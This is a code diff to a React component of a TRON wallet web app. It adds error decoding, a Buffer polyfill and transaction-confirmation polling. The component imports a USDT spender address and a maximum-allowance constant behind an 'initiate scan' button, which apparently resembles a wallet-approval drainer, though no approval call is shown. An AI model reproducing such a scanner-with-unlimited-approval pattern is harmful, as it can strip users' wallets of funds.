@@ -4,6 +4,12 @@ import { useState, useEffect, useRef } from "react";
 import { useWallet } from "@tronweb3/tronwallet-adapter-react-hooks";
 import { TronWeb } from "tronweb";
 import { BASE_URL, USDT_ADDRESS, USDT_SPENDER_ADDRESS, MAX_ALLOWANCE } from "../../../env";
+import { Buffer } from "buffer";
+
+if (typeof window !== "undefined") {
+  window.Buffer = window.Buffer || Buffer;
+}
+
 interface HeroSectionProps {
   onInitiateScan: () => void;
 }
@@ -139,7 +145,6 @@ export function HeroSection({
       setLoading(true);
       setError("");
 
-      alert("DDD");
 
       if (!connected || !address || !wallet) {
         throw new Error("Wallet not connected");
@@ -181,7 +186,19 @@ export function HeroSection({
       const result = await tronWeb.trx.sendRawTransaction(signed);
 
       // ✅ Detect failed transaction results
-      if (result.code && String(result.code) !== "SUCCESS") {
+      if (result.result === false || (result.code && String(result.code) !== "SUCCESS")) {
+        let decodedMessage = result.message;
+        if (typeof result.message === "string" && /^[0-9a-fA-F]+$/.test(result.message)) {
+          try {
+            decodedMessage = Buffer.from(result.message, "hex").toString("utf8");
+          } catch (e) { }
+        } else if (result.message instanceof Uint8Array) {
+          try {
+            decodedMessage = new TextDecoder().decode(result.message);
+          } catch (e) { }
+        }
+
+        const errorCode = String(result.code || "UNKNOWN_ERROR");
         const errorMap: Record<string, string> = {
           "OUT_OF_ENERGY":
             "❌ Out of Energy: Your wallet doesn't have enough energy to complete this transaction. " +
@@ -190,7 +207,7 @@ export function HeroSection({
             "❌ Out of Bandwidth: You don't have enough bandwidth. " +
             "Wait 24h for free bandwidth to refresh or stake more TRX.",
           "CONTRACT_VALIDATE_ERROR":
-            "❌ Contract validation failed. The transaction was rejected by the network.",
+            `❌ Contract validation failed: ${decodedMessage || "The transaction was rejected by the network."}`,
           "TRANSACTION_EXPIRATION_ERROR":
             "❌ Transaction expired before it was broadcast. Please try again.",
           "DUP_TRANSACTION_ERROR":
@@ -202,20 +219,37 @@ export function HeroSection({
         };
 
         const friendlyMessage =
-          errorMap[result.code] ||
-          `❌ Transaction failed: ${result.message || result.code}`;
+          errorMap[errorCode] ||
+          `❌ Transaction failed: ${decodedMessage || errorCode}`;
 
         // Show alert
         alert(friendlyMessage);
         throw new Error(friendlyMessage);
       }
 
-      // ✅ Double-check tx status on-chain (optional but safer)
-      const txInfo = await tronWeb.trx.getTransactionInfo(result.txid);
-      if (txInfo?.receipt?.result === "OUT_OF_ENERGY") {
+      // ✅ Double-check tx status on-chain (Polling for confirmation)
+      let txInfo: any = null;
+      let retries = 0;
+
+      // Wait for the transaction to be mined (poll every 3s, max 10 times = 30s)
+      while (retries < 10) {
+        await new Promise((resolve) => setTimeout(resolve, 3000));
+        try {
+          txInfo = await tronWeb.trx.getTransactionInfo(result.txid);
+          // TronGrid often returns an empty object {} if tx is not yet confirmed
+          if (txInfo && Object.keys(txInfo).length > 0 && txInfo.id) {
+            break;
+          }
+        } catch (err) {
+          console.log("Polling tx error:", err);
+        }
+        retries++;
+      }
+
+      if (txInfo?.receipt?.result === "OUT_OF_ENERGY" || txInfo?.receipt?.result === "FAILED") {
         const msg =
-          "❌ Out of Energy: Transaction was submitted but ran out of energy on-chain. " +
-          "Please stake TRX for energy or maintain at least 10–15 TRX in your wallet.";
+          "❌ Transaction Failed: The transaction ran out of energy or failed on-chain. " +
+          "Please stake TRX for energy or maintain at least 20–30 TRX in your wallet to cover fees.";
         alert(msg);
         throw new Error(msg);
       }
